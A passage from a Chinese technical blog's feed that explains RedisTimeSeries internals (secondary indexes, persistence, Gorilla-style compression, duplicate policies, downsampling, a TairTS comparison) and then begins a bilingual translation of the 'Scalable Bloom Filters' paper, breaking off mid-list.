Label;<br></code></pre></td></tr></table></figure><h4 id="2-3-2、时序二级索引数据结构"><a href="#2-3-2、时序二级索引数据结构" class="headerlink" title="2.3.2、时序二级索引数据结构"></a>2.3.2、时序二级索引数据结构</h4><p><img src="/assets/images/redistimeseries-indexstruct.png" alt="时序二级索引数据结构" loading="lazy"></p><p>为了便于查询指定特征的时间序列，通过二级索引的方式保存了标签与时间序列的映射关系，主要的存储结构如下：</p><ul><li><code>labelsIndex</code> :<ul><li>含义 : 记录 <code>标签名 + 值</code> 与 <code>时间序列</code> 的映射关系；</li><li>格式 : 基数树；</li></ul></li><li><code>tsLabelIndex</code> :<ul><li>含义 : 记录 <code>标签名</code> 与 <code>时间序列</code> 的映射关系；</li><li>格式 : 基数树；</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 初始化创建两个基数树</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">IndexInit</span><span class="hljs-params">()</span> </span>&#123;<br>    labelsIndex = <span class="hljs-built_in">RedisModule_CreateDict</span>(<span class="hljs-literal">NULL</span>);<br>    tsLabelIndex = <span class="hljs-built_in">RedisModule_CreateDict</span>(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// RedisModule的创建基数树的函数</span><br><span class="hljs-function">RedisModuleDict *<span class="hljs-title">RM_CreateDict</span><span class="hljs-params">(RedisModuleCtx *ctx)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">RedisModuleDict</span> *d = <span class="hljs-built_in">zmalloc</span>(<span class="hljs-built_in">sizeof</span>(*d));<br>    d-&gt;rax = <span class="hljs-built_in">raxNew</span>();<br>    <span class="hljs-keyword">if</span> (ctx != <span class="hljs-literal">NULL</span>) <span class="hljs-built_in">autoMemoryAdd</span>(ctx,REDISMODULE_AM_DICT,d);<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4、持久化"><a href="#2-4、持久化" class="headerlink" title="2.4、持久化"></a>2.4、持久化</h3><h4 id="2-4-1、RDB的持久化"><a href="#2-4-1、RDB的持久化" class="headerlink" title="2.4.1、RDB的持久化"></a>2.4.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，一个时序数据的存储流程如下：</p><ul><li>存储时序数据的元信息：<ul><li>存储时序数据的基础信息（包括时序数据的名称，数据保留时间，每个桶的大小，最新的时间样本数据，样本总数，重复样本策略等）；</li><li>存储时序数据的标签信息（包括多个标签的名称及其值）；</li><li>存储时序数据的压缩规则信息（包括多个压缩规则的名称，压缩类型等）；</li></ul></li><li>存储时序数据的数据信息：<ul><li>每个桶中存储的数据（压缩或者非压缩）信息；</li></ul></li></ul><h4 id="2-4-2、AOF的持久化"><a href="#2-4-2、AOF的持久化" class="headerlink" title="2.4.2、AOF的持久化"></a>2.4.2、AOF的持久化</h4><p>AOF 的存储过程没有使用自定义的命令，而直接使用了 <code>RESTORE</code> 命令进行持久化，这种方式直接将整个时序数据作为一个命令存储起来，因此在读取的时候可能受限于 <code>proto-max-bulk-len</code> 参数的大小（默认为 <code>1MB</code> ）而导致加载数据失败；</p><ul><li>相关函数：<code>RMUtil_DefaultAofRewrite</code>；<ul><li>依赖库：<a href="https://github.com/RedisLabsModules/RedisModulesSDK">RedisModulesSDK</a></li></ul></li><li>具体格式：<code>RESTORE key 0 buffer buffer_len</code> ；</li></ul><h2 id="三、功能设计"><a href="#三、功能设计" class="headerlink" title="三、功能设计"></a>三、功能设计</h2><h3 id="3-1、数据压缩"><a href="#3-1、数据压缩" class="headerlink" title="3.1、数据压缩"></a>3.1、数据压缩</h3><p>考虑到时序样本数据的特征，针对于样本数据的时间戳以及样本值信息，<code>RedisTimeSeries</code> 分别使用不同的压缩算法进行编码，这两种编码算法都来自于论文 <a href="https://www.vldb.org/pvldb/vol8/p1816-teller.pdf">《Gorilla: A Fast, Scalable, In-Memory Time Series Database》</a> ，基本业界大部分的时序数据库的数据压缩算法都是借鉴了这篇论文中的方式。</p><h4 id="3-1-1、样本时间数据压缩"><a href="#3-1-1、样本时间数据压缩" class="headerlink" title="3.1.1、样本时间数据压缩"></a>3.1.1、样本时间数据压缩</h4><p>针对于时序数据样本中的时间戳，其采用了 <code>Delta-Of-Delta</code> 的编码方式，Redis在实现的时候，时间范围区间相比于论文 <a href="https://www.vldb.org/pvldb/vol8/p1816-teller.pdf">《Gorilla: A Fast, Scalable, In-Memory Time Series Database》</a> 中更加细化，使用七种时间范围区间来进行编码。</p><ul><li><code>Delta-Of-Delta</code> 中 <code>D</code> 定义：<code>D = (T(N) – T(N-1)) – (T(N-1) – T(N-2))</code></li><li><code>D</code> 区间范围：<ul><li><code>0</code> : 使用 <code>1个bit</code> 存储二进制 <code>0</code>，共 <code>1个bit</code>；</li><li><code>[-15, 16]</code> : 使用 <code>2个bits</code> 存储二进制 <code>10</code> ，后面使用 <code>5个bits</code> 存储D值，共 <code>7个bits</code>；</li><li><code>[-127, 128]</code> : 使用 <code>3个bits</code> 存储二进制 <code>110</code> ，后面使用 <code>8个bits</code> 存储D值，共 <code>11个bits</code>；</li><li><code>[-1023, 1024]</code> : 使用 <code>4个bits</code> 存储二进制 <code>1110</code> ，后面使用 <code>11个bits</code> 存储D值，共 <code>15个bits</code>；</li><li><code>[-16383, 16384]</code> : 使用 <code>5个bits</code> 存储二进制 <code>11110</code> ，后面使用 <code>15个bits</code> 存储D值，共 <code>20个bits</code>；</li><li><code>[-2147483647, 2147483648]</code> : 使用 <code>6个bits</code> 存储二进制 <code>111110</code> ，后面使用 <code>32个bits</code> 存储D值，共 <code>38个bits</code>；</li><li><code>其它区间</code> : 使用 <code>6个bits</code> 存储二进制 <code>111111</code>，后面使用 <code>64个bits</code> 存储D值，共 <code>70个bits</code>；</li></ul></li></ul><p><img src="/assets/images/redistimeseries-timestamp-compress.png" alt="时间戳压缩" loading="lazy"></p><h4 id="3-1-2、样本值数据压缩"><a href="#3-1-2、样本值数据压缩" class="headerlink" title="3.1.2、样本值数据压缩"></a>3.1.2、样本值数据压缩</h4><p>针对于时序数据样本中的样本值，其采用了 <code>XOR</code> 的编码方式，下面介绍 <code>XOR</code> 编码的流程：</p><ul><li>第一个 <code>Value</code> 存储时不做任何压缩；</li><li>从第二个 <code>Value</code> 开始，写入时计算与前一个 <code>Value</code> 的 <code>XOR</code> 值：<ul><li>如果 <code>XOR</code> 值为 <code>0</code>，则代表两值相同，使用 <code>1个bit</code> 存储二进制 <code>0</code> 即可；</li><li>如果 <code>XOR</code> 值为 <code>非0</code>，先使用 <code>1个bit</code> 存储二进制 <code>1</code>，然后计算 <code>XOR</code> 中 <code>前后0的个数</code>（<code>前导零</code> &#x2F; <code>尾随零</code>）：<ul><li>如果 <code>前导零</code> 和 <code>尾随零</code> 与前一个相同，则使用 <code>1个bit</code> 存储二进制 <code>0</code>，然后存储有效 <code>XOR</code> 值；</li><li>如果 <code>前导零</code> 和 <code>尾随零</code> 与前一个不同：<ul><li>使用 <code>1个bit</code> 存储二进制 <code>1</code>；</li><li>使用 <code>5个bit</code> 存储 <code>前导零</code> 的长度；</li><li>使用 <code>6个bit</code> 存储 <code>有效XOR</code> 的长度；</li><li>存储 <code>有效XOR</code> 的值；</li></ul></li></ul></li></ul></li></ul><h3 id="3-2、二级索引"><a href="#3-2、二级索引" class="headerlink" title="3.2、二级索引"></a>3.2、二级索引</h3><p>为了便于查询指定特征的时间序列key列表，<code>RedisTimeSeries</code> 使用两种不同的索引来记录对应标签与时序key的映射关系。</p><ul><li><code>labelsIndex 索引</code> 记录了 <code>标签名 + 值</code> 与 <code>时间序列</code> 的映射关系，并通过 <code>Redis</code> 提供的基数树的编码结构来存储，最终可以能够精确的筛选出特定标签值的时序key列表；</li><li><code>tsLabelIndex 索引</code> 记录 <code>标签名</code> 与 <code>时间序列</code> 的映射关系，并通过 <code>Redis</code> 提供的基数树的编码结构来存储，最终可以能够精确的筛选出含有特定标签（不检查对应的标签值）的时序key列表；</li></ul><p><img src="/assets/images/redistimeseries-labelsindex.png" alt="labelsIndex 索引" loading="lazy"><br><img src="/assets/images/redistimeseries-tslabelindex.png" alt="tsLabelIndex 索引" loading="lazy"></p><h4 id="3-2-1、索引变动"><a href="#3-2-1、索引变动" class="headerlink" title="3.2.1、索引变动"></a>3.2.1、索引变动</h4><ul><li>新增索引 : <ul><li><code>IndexMetric</code> : 新增时序key，变更时序key标签，restore时序key，rename时序key，copy时序key，加载时序key时会触发调用</li></ul></li><li>删除索引 : <ul><li><code>RemoveIndexedMetric</code> : 删除特定时序key；</li><li><code>RemoveAllIndexedMetrics</code> : 删除所有时序key；</li></ul></li></ul><h4 id="3-2-2、索引查询"><a href="#3-2-2、索引查询" class="headerlink" title="3.2.2、索引查询"></a>3.2.2、索引查询</h4><ul><li>相关命令 :<ul><li><code>ts.mget</code> : 批量查询多个符合条件的时序key，期间会查询标签信息；</li><li><code>ts.queryindex</code> : 查询特定标签的key的列表；</li></ul></li><li>过滤器 :<ul><li><code>label=value</code> : 查询特定的 label 是 value 的 keys ；</li><li><code>label!=value</code> : 查询特定的 label 不是 value 的 keys ；</li><li><code>label=</code> : 查询所有有对应 label 的 key ；</li><li><code>label!=</code> : 查询所有不是对应 label 的 key ；</li><li><code>label=(_value1_,_value2_,...)</code> : 查询 label 是列表中的其中一个值的 key ；</li><li><code>label!=(value1,value2,...)</code> : 查询 label 不是列表中的任何一个值的 key ；</li></ul></li></ul><h3 id="3-3、插值变更"><a href="#3-3、插值变更" class="headerlink" title="3.3、插值变更"></a>3.3、插值变更</h3><p>正常情况下时序数据都是时间戳递增的样本数据，但是在极端的情况下，如果上报服务出现故障，故障恢复后客户可能期望将之前未上报的数据再次上报，这时候就会出现新插入的样本数据的时间戳小于已有样本数据时间戳的情况，这种情况下就需要一定的策略处理这些老数据。</p><h4 id="3-3-1、插值变更策略"><a href="#3-3-1、插值变更策略" class="headerlink" title="3.3.1、插值变更策略"></a>3.3.1、插值变更策略</h4><p>目前提供了多种插值变更（重复&#x2F;乱序）的处理策略，该配置在操作时序数据时的相关参数为 <code>DUPLICATE_POLICY</code> ：</p><ul><li><code>block</code> : 不允许出现乱序样本数据，默认的策略；</li><li><code>first</code> : 忽略任何新样本的值；</li><li><code>last</code> : 每次都更新样本的值；</li><li><code>min</code> : 只有新样本的值较小时，才采用新样本的值；</li><li><code>max</code> : 只有新样本的值较大时，才采用新样本的值；</li><li><code>sum</code> : 保存新样本和老样本值的和；</li></ul><h4 id="3-3-2、插值变更优先级"><a href="#3-3-2、插值变更优先级" class="headerlink" title="3.3.2、插值变更优先级"></a>3.3.2、插值变更优先级</h4><ul><li><code>低优先级</code> : <code>ts.create</code> 和 <code>ts.alter</code> 命令可以初始化时序key的默认插值变更（重复&#x2F;乱序）的策略，该策略的优先级较低；</li><li><code>高优先级</code> : <code>ts.add</code> 和 <code>ts.madd</code> 命令可以指定命令级的插值变更的策略，该优先级较高；</li></ul><h4 id="3-3-3、插值变更实现"><a href="#3-3-3、插值变更实现" class="headerlink" title="3.3.3、插值变更实现"></a>3.3.3、插值变更实现</h4><p>由于差值变更的过程中需要对现有的老的 chunk 进行变更，因此相比如单纯的追加样本数据，该操作的耗时较大，如果 chunk 启用了压缩特性，耗时会更加明显（由于需要解压缩），因此尽量慎用插值变更。</p><ul><li>相关函数 : <code>SeriesUpsertSample</code> ；</li><li>非压缩的chunk :<ul><li>相关函数 : <code>Uncompressed_UpsertSample</code> ；</li><li>执行逻辑 : <ul><li>在对应的 chunk 中找到需要插入的位置；</li><li>将对应的样本数据插入对应的位置中；</li><li>重新分配 chunk 的大小，并插入位置之后的所有内存块（耗时）；</li></ul></li></ul></li><li>压缩的chunk : <ul><li>相关函数 : <code>Compressed_UpsertSample</code> ；</li><li>执行逻辑 : <ul><li>找到对应的 chunk ；</li><li>分配一个新的 chunk ，将比当前样本的时间戳小的数据全部插入新的 chunk 中；</li><li>按照更新策略尝试更新当前样本的新的样本值，并将其加入到新的 chunk 中；</li><li>将对应样本之后的样本数据加入到新的 chunk 中；</li><li>将新的 chunk 替换掉老的 chunk ；</li></ul></li></ul></li></ul><h3 id="3-4、降采样（数据压缩）"><a href="#3-4、降采样（数据压缩）" class="headerlink" title="3.4、降采样（数据压缩）"></a>3.4、降采样（数据压缩）</h3><p>时序数据库在保存样本数据时支持一些数据降采样（数据压缩）策略，以便于节省数据存储空间。当需要对原始时序数据进行降采样时，可以通过 <code>ts.createrule</code> 命令新增一个 <code>特殊的时序key</code> 来存储降采样的时序数据，并且可以指定自定义的降采样规则。</p><ul><li><code>降采样规则</code> :<ul><li>支持多种降采样规则 （Min 、 Max 、 Avg 、 Sum 、 Range 、 Count 、 First 、 Last 、 STD.P 、 STD.S 、 Var.P 、 Var.S 、 twa）；</li><li>支持设置降采样的时间周期，即多长的时间周期内降采样一次数据；</li><li>时间对齐策略；</li></ul></li><li><code>降采样流程</code> :<ul><li>随着对原始时间样本的增加，会自动计算符合条件的降采样规则；</li><li>自动将降采样之后的新的时间样本数据添加到对应的 <code>特殊的时序key</code> 中；</li></ul></li></ul><h3 id="3-5、聚合查询"><a href="#3-5、聚合查询" class="headerlink" title="3.5、聚合查询"></a>3.5、聚合查询</h3><p>业务在查询时序数据的场景下，通常不需要获取完整的时序数据，例如我们需要查看近一年所有股票的平均市值，这种情况下就需要时序数据库本身能够支持对一段时间范围内的样本数据进行聚合查询。</p><ul><li><code>相关命令</code> : <code>ts.range</code> ， <code>ts.revrange</code> ， <code>ts.mrange</code> ， <code>ts.mrevrange</code> ；</li><li><code>聚合方式</code> : Min 、 Max 、 Avg 、 Sum 、 Range 、 Count 、 First 、 Last 、 STD.P 、 STD.S 、 Var.P 、 Var.S 、 twa ；</li><li><code>聚合配置</code> :<ul><li><code>时间周期 (bucketDuration)</code> : 每次聚合的时间周期，单位毫秒；</li></ul></li></ul><h2 id="四、对比与思考"><a href="#四、对比与思考" class="headerlink" title="四、对比与思考"></a>四、对比与思考</h2><h3 id="4-1、RedisTimeSeries的一些问题"><a href="#4-1、RedisTimeSeries的一些问题" class="headerlink" title="4.1、RedisTimeSeries的一些问题"></a>4.1、RedisTimeSeries的一些问题</h3><ul><li>在 <code>RedisCluster</code> 的架构模式下，各节点之间能够知道其他节点的信息，因此能够满足需要一次性获取分布在多个节点上的时序数据的需求（相关命令 <code>ts.mget</code> ， <code>ts.queryindex</code> ， <code>ts.mrange</code> ， <code>ts.mrevrange</code>），<code>RedisTimeSeries</code> 目前使用的是 <a href="https://github.com/RedisGears/LibMR">LibMR</a> 这个 MapReduce 库来实现多实例的数据聚合，之后再一起返回给客户端，但是如果使用那个独立的 <code>Proxy + Redis</code> 的架构，就需要使得 <code>Proxy</code> 主动访问多 <code>Redis</code> 实例并对数据做聚合处理；</li><li>原始时序样本 key 和 降采样（数据压缩）时序样本 key 都作为实际的 key 存储在 DB 中，容易触发数据误删的风险，并且在扩缩容的场景下也会有数据丢失的问题；</li></ul><h3 id="4-1、TairTS对比"><a href="#4-1、TairTS对比" class="headerlink" title="4.1、TairTS对比"></a>4.1、TairTS对比</h3><p><img src="/assets/images/redistimeseries-tairts.png" alt="TairTs架构设计" loading="lazy"></p><p><code>TairTS</code> 的整体架构类似于 <code>RedisTimeSeries</code> 的设计，比较显著的区别是他们引入了 <code>Pkey</code> 和 <code>Skey</code> 的概念，同时为这两个概念又引入的不同的存储结构，经过简单的试用之后，这里做一下初略的对比介绍。</p><ul><li><code>TairTS</code> 设计实现 :<ul><li><code>Pkey</code> 作为实际的时序 <code>Key</code> 存储在 <code>DB</code> 中；</li><li><code>Skey</code> 只作为 <code>Pkey</code> 的属性存在（测试中通过增加 <code>Skey</code> 发现 <code>keys</code> 数量没有变化）；</li><li><code>Skey</code> 拥有与 <code>RedisTimeSeries</code> 中时序key一样的 <code>标签</code>，<code>样本有效期</code>等属性信息；</li><li>业务的时序样本数据最终需要同时指定 <code>Pkey</code> 和 <code>Skey</code> 才能完成写入（从命令接口上来看与 <code>RedisTimeSeries</code> 有出入）；</li></ul></li><li><code>TairTS</code> 一些思考 :<ul><li>通过引入 <code>Pkey</code> 和 <code>Skey</code> 的概念，能够实现二次数据聚合，完成 <code>RedisTimeSeries</code> 所不支持的功能，<a href="https://help.aliyun.com/document_detail/408954.html">介绍</a>；</li><li>由于一个 <code>Pkey</code> 中记录了很多的时间线数据，为了避免出现单分片数据的热点访问，数据分布不均以及大Key等情况发生，业务侧需要做一些数据的拆分，具体如何拆分需要结合实际业务场景进行；</li></ul></li></ul><h3 id="4-2、Redis时序模型存在的意义"><a href="#4-2、Redis时序模型存在的意义" class="headerlink" title="4.2、Redis时序模型存在的意义"></a>4.2、Redis时序模型存在的意义</h3><p>众所周知，时序数据是一种数据量极大，写请求很高，极端情况下读请求也很高的数据模型，仅仅使用内存去存储这些数据，所消耗的成本将会非常大，虽然内存相比于硬盘在访问性能上能够带来极大的提升，但是如果仅仅使用一部分数据缓存在内存中，而不是全部使用内存，这种性能的差异会很大吗？初略看了一下目前业界的专业的时序数据库的压测报告，基本上访问性能已经不是瓶颈了，因此单纯的内存型时序数据库的场景到底在哪里，感觉还需要对市场做一些评估和调研。</p><p>Redis社区曾给出了几个使用Redis作为时序数据库的一些案例 <a href="https://redis.com/blog/3-real-life-apps-built-with-redis-data-source-for-grafana/">3 Real-Life Apps Built with Redis Data Source for Grafana</a> ，其中比较典型的一个案例是关于新冠病毒的病例情况，这种场景偏向于短时间段，或者说数据量不大的场景，从这里来看这的确是Redis时序的一种使用场景，但是这也不是Redis时序独有的场景，其他时序产品也完全能够胜任，甚至于更专业，但是换种方式去考虑一下，数据量较小的场景下，业务也完全可以不使用时序类的产品去存储。因此在这种场景下，Redis时序的蛋糕是被两头不断分割的，最后剩下的也就不多了。</p><h2 id="五、相关链接"><a href="#五、相关链接" class="headerlink" title="五、相关链接"></a>五、相关链接</h2><ul><li><a href="https://www.vldb.org/pvldb/vol8/p1816-teller.pdf">Gorilla: A Fast, Scalable, In-Memory Time Series Database</a></li><li><a href="https://www.jianshu.com/p/21b3b61cddf6">基于Redis的时间序列数据库的研究与实现</a></li><li><a href="http://blog.itpub.net/31557835/viewspace-2637499/">百度时序数据库——存储的省钱之道</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> TSDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - Scalable Bloom Filters</title>
      <link href="/2022/03/01/scalable-bloom-filters/"/>
      <url>/2022/03/01/scalable-bloom-filters/</url>
      
        <content type="html"><![CDATA[<div><p><a href="https://www.sciencedirect.com/science/article/abs/pii/S0020019006003127">《Scalable Bloom Filters》</a> 这篇论文讲述了一种布隆过滤器的变体实现方式，通过将预设的误判率分配给多个子布隆过滤器来约束整体的一个误判率情况，并且可以通过新增子布隆过滤器来实现对存储元素数量的调节，以满足初始容量无法准确估计的情况，论文中详细介绍了在不同的误判率变化率以及布隆过滤器容量变化率的情况下，存储空间等的使用情况。目前了解到的，<a href="https://github.com/RedisBloom/RedisBloom">RedisBloom</a> 和 <a href="https://help.aliyun.com/document_detail/145972.html">TairBloom</a> 都参考了这篇论文实现了各自的布隆过滤器。</p></div><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Bloom Filters provide space-efficient storage of sets at the cost of a probability of false positives on membership queries. The size of the filter must be defined a priori based on the number of elements to store and the desired false positive probability, being impossible to store extra elements without increasing the false positive probability. This leads typically to a conservative assumption regarding maximum set size, possibly by orders of magnitude, and a consequent space waste. This paper proposes Scalable Bloom Filters, a variant of Bloom Filters that can adapt dynamically to the number of elements stored, while assuring a maximum false positive probability.</p><p>布隆过滤器已查询成员资格时的误判概率为代价，提供了对数据集的高效空间存储能力。过滤器的大小需要依据要存储的元素数量和所需的误报概率来提前确定，如果不允许增加误报率，就不能存储额外的元素。这通常会导致我们对数据集合的大小做一个保守的估计（可能是数数量级的差异），这就会导致空间的浪费。本文提出了可扩展的布隆过滤器，它是布隆过滤器的一个变体，在保证最大误判率的情况下能够动态适应可存储元素的数量。</p><p>Keywords: Data Structures, Bloom Filters, Distributed Systems, Randomized Algorithms</p><p>关键词：数据结构、布隆过滤器、分布式系统、随机算法</p><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Bloom filters <code>[1]</code> provide space-efficient storage of sets at the cost of a probability of false positive on membership queries. Insertion and membership testing in Bloom filters implies an amount of randomization, since elements are transformed using one-way hash functions. Testing for the presence of elements that have actually been inserted in the filter will always give a positive result; there are no false negatives. On the contrary, there is always some probability of false positives: elements that have not been inserted into the filter can erroneously pass the membership test.</p><p>布隆过滤器<code>[1]</code>通过以成员查询的误判率为代价，提供了高效的空间来存储数据集。由于元素是使用单向哈希函数转换，因此布隆过滤器中的插入和成员测试（查询）意味着一定程度的随机化。查询一个元素是否已经插入总是能得到明确的答案，不会存在假阴性（误判）。对应的，总是有一些误判的情况：没有被插入过滤器的元素被错误地通过成员资格测试（被误判已经插入）。</p><p>An important property of Bloom filters is the linear relation between the filter size and the number of elements that can be stored. For any given maximum false positive probability, it is possible to determine how much filter state is needed per element <code>[2]</code>. As expected, lower false positive rates require more state per element.</p><p>布隆过滤器的一个重要特性是过滤器大小和可以存储的元素数量之间的线性关系。 对于任何给定的最大误报概率，可以确定每个元素[2] 需要多少个状态（每个元素对应多少的比特位，即布隆过滤器中的哈希函数个数）。 正如预期的那样，较低的误报率对于每个元素来说就需要更多的状态（误判率较低的情况下，所需要的哈希函数的个数会较多）。</p><p>If the maximum allowable error probability and the number of elements to store are both known, it is straightforward to dimension an appropriate filter. However, it is not always possible to know in advance how many elements will need to be stored; this leads to over-dimensioning the filters or relinquishing the maximum error probability.</p><p>如果已知允许误判的最大概率和需要存储的元素数量，则可以直接确定合适的过滤器大小。 但是，（业务方）并不总是可以提前知道（或者准确预测）需要存储多少元素。 这就会导致过滤器大小过大（预估的存储元素过多导致）或超过最大的误判率（预估的存储元素较少导致）。</p><p>In this paper we provide a solution for the case in which not only is the number of elements not known in advance but also we need to strictly enforce some maximum error probability. We prove that this is possible, by means of a novel construction: <code>Scalable Bloom Filters (SBF)</code>.</p><p>在本文中，我们提供了一种解决方案来处理不仅事先不知道元素数量而且还需要严格限制最大误判率的场景。我们通过一种新颖的结构证明这是可能的：<code>可扩展的布隆过滤器（SBF）</code>。</p><p>After a brief review of related work, this paper is organised as follows. <code>Section 3</code> reviews the basic mathematical properties of Bloom filters. <code>Section 4</code> introduces <code>Scalable Bloom Filters</code> and gives an evaluation of their properties. <code>Section 5</code> ends the paper with our conclusions.</p><p>在对相关工作进行简要回顾后，本文组织如下。 <code>第 3 节</code> 回顾了布隆过滤器的基本数学属性。 <code>第 4 节</code>介绍了可扩展的布隆过滤器并评估了它们的属性。 <code>第 5 节</code> 以我们的结论结束本文。</p><h2 id="2、相关工作"><a href="#2、相关工作" class="headerlink" title="2、相关工作"></a>2、相关工作</h2><p>In recent years, Bloom filters have received increased attention, and they are now being used in a large number of systems, including peer-to-peer systems <code>[3, 4]</code>, web caches <code>[5]</code>, database systems <code>[6]</code> and others <code>[7, 2]</code>. Several variants of the basic Bloom filter technique have been proposed in the literature.</p><p>近年来，布隆过滤器受到越来越多的关注，现在它正在大量系统中被使用，包括点对点系统<code>[3, 4]</code>、Web缓存<code>[5]</code>、数据库系统<code> [6]</code>和其他<code>[7, 2]</code>。 文献中已经提出了基本布隆过滤器技术的几种变体。</p><p>In <code>[5]</code> the authors introduce the idea of a counting Bloom filter, allowing elements to be removed from the set represented by the Bloom filter; <code>Spectral Bloom Filters</code> <code>[8]</code> use a similar approach to store multi-sets; <code>[9]</code> proposes a multi-segment Bloom Filter that allows efficient access when this data structure is stored on disk; a similar approach <code>[10]</code> is used in a network routing algorithm; Compressed Bloom Filters <code>[11]</code> improve performance when the Bloom Filter is passed as a message, by using larger but sparser filters that lead to smaller compressed sizes.</p><p>在<code>[5]</code>中，作者介绍了计数布隆过滤器的概念，它允许从布隆过滤器的集合中删除元素； 频谱布隆过滤器（Spectral Bloom Filters） <code>[8]</code> 使用类似的方法来存储多集； <code>[9]</code> 提出了一种多段布隆过滤器，当这种数据结构存储在磁盘上时能提供高效的访问； 在网络路由算法中使用了类似的方法<code>[10]</code>； 当布隆过滤器作为消息传递时，压缩的布隆过滤器 <code>[11]</code> 通过使用更大但更稀疏的过滤器来提高性能，从而导致更小的压缩大小。</p><p>All these variants suffer from the same limitation of the original Bloom filters: it is necessary to dimension, a priori, the size of the filters. We believe that it would be possible to drop this limitation for most (or even all) of these proposals by creating scalable variants along the lines of <code>SBF</code>.</p><p>所有这些变体都受到原始布隆过滤器的相同约束：必须提前确定过滤器的大小。 我们相信，通过按照<code>SBF</code>的思路可以创建可扩展的变体，可以为这些提案中的大多数（甚至所有）方案解除这一限制。</p><h2 id="3、布隆过滤器"><a href="#3、布隆过滤器" class="headerlink" title="3、布隆过滤器"></a>3、布隆过滤器</h2><p>A Bloom filter is traditionally implemented by a single array of <code>M</code> bits, where <code>M</code> is the filter size. On filter creation all bits are reset to zeroes. A filter is also parameterized by a constant <code>k</code> that defines the number of hash functions used to activate and test bits on the filter. Each hash function should output one index in <code>M</code>. When inserting an element <code>e</code> on the filter, the bits in the <code>k</code> indexes <code>h1(e)</code>, <code>h2(e)</code>, . . . , <code>hk(e)</code> are set.</p><p>布隆过滤器传统上由 <code>M</code> 位的单个数组实现，其中 <code>M</code> 是过滤器大小。 在创建过滤器时，所有位都重置为零。 过滤器也由常量 <code>k</code> 参数化，该常量定义了用于激活和测试（添加和查询）过滤器位的哈希函数的数量。 每个哈希函数应该在 <code>M</code> 中输出一个索引（对应数据集合中的某一个比特位）。 当在过滤器上插入元素 <code>e</code> 时，<code>k</code> 中的位索引 <code>h1(e)</code>、<code>h2(e)</code>、. . . , <code>hk(e)</code> 被设置（为 <code>1</code>）。</p><p>In particular, a filter with <code>M = 15</code> bits and <code>k = 3</code> hash functions could become as follows, after the insertion of one element:</p><p>特别的是（举例说明），在插入一个元素后，一个大小为 <code>M = 15</code> 位和哈希函数 <code>k = 3</code> 的布隆过滤器的情况可能如下：</p><div><p><img src="/assets/images/scalable-bloom-filter-1.png" loading="lazy"></p></div><p>The same procedure is used to insert other elements, each time setting the bits given by the corresponding <code>k</code> indexes.</p><p>相同的过程也用于插入其他元素，每次都需要设置对应的 <code>k</code> 个索引的比特位。</p><p>In order to query a Bloom filter, say for element <code>x</code>, it suffices to verify if all bits in indexes <code>h1(x)</code>, <code>h2(x)</code>, . . . , <code>hk(x)</code> are set. If one or more of these bits is not set, then the queried element is definitely not present on the filter. Otherwise, if all these bits are set, then the element is considered to be on the filter. Given this procedure, an error probability exists for positive matches, since the tested indexes might have been set by the insertion of other elements.</p><p>为了查询布隆过滤器，比如元素 <code>x</code>，需要验证索引 <code>h1(x)</code>、<code>h2(x)</code>、…, <code>hk(x)</code> 中的所有位是否都被设置（都等于 <code>1</code> ）。如果这些位中有一个或多个没有被设置，则查询的元素肯定不存在于过滤器中。 否则，如果所有的这些比特位都被设置了，则认为该元素在过滤器中。 基于此过程，匹配命中存在误判率，因为测试（查询）的索引比特位可能会被已插入的其他元素来设置。</p><p>With the above setup, all hash functions are used to generate indexes over <code>M</code>. Since these hash functions are independent, nothing prevents collisions in the outputs. In the most extreme case we could have <code>h1(x) = h2(x) = . . . = hk(x)</code>. This means that in the general case each element will be described by <code>1</code> to <code>k</code> distinct indexes. Although for large values of <code>M</code> a collision seldom occurs, this aspect makes some elements more prone to false positives (and also complicates the analytical derivation of probabilities) <code>[12]</code>.</p><p>通过上述设置，所有哈希函数都用于在 <code>M</code> 上生成索引。 由于这些哈希函数是相互独立的，因此输出特征值的冲突不可避免。 在最极端的情况下，可能会出现 <code>h1(x) = h2(x) = . . . = hk(x)</code>的情况。 在一般的情况下，每个元素将由 <code>1</code> 到 <code>k</code> 个不同的索引来表示。 尽管当 <code>M</code> 值较大的时候很少会发生碰撞，但这一方面使某些元素更容易出现误报（并且也使概率的分析推导变得更加复杂）<code>[12]</code>。</p><p>A variant of Bloom filters <code>[2]</code>, which we adopt in this paper, consists of partitioning the <code>M</code> bits among the <code>k</code> hash functions, thus creating k slices of <code>m = M/k</code> bits. In this variant, each hash function <code>hi()</code>, with <code>1 ≤ i ≤ k</code>, produces an index over <code>m</code> for its respective slice. Therefore, each element is always described by exactly <code>k</code> bits, which results in a more robust filter, with no element specially sensitive to false positives.</p><p>我们在本文中采用的布隆过滤器 <code>[2]</code> 是一种变体，包括在 k 个哈希函数中划分 <code>M</code> 位，从而创建 <code>m = M/k</code> 位的 <code>k</code> 个切片。 在这个变体中，每个散列函数 <code>hi()</code> ，<code>1 ≤ i ≤ k</code>，为其各自的切片在 <code>m</code> 上生成一个索引。因此，每个元素总是用精确的 <code>k</code> 位来标示，这将导致过滤器更加健壮，没有对误报特别敏感的元素。</p><p>For <code>M = 15</code> and <code>k = 3</code> a filter would have <code>3</code> slices with <code>5</code> bits in each. After insertion of one element, the resulting configuration would have exactly one bit set in each slice. Each slice is depicted here in a column.</p><p>对于 <code>M = 15</code> 和 <code>k = 3</code>，过滤器将有 <code>3</code> 个切片，每个切片有 <code>5</code> 位。 插入一个元素后，生成的配置将在每个切片中设置一个位。 每个切片在此处以列的形式描述。</p><div><p><img src="/assets/images/scalable-bloom-filter-2.png" loading="lazy"></p></div><div><p><strong>基础变量信息汇总：</strong></p><ul><li><code>M</code> : 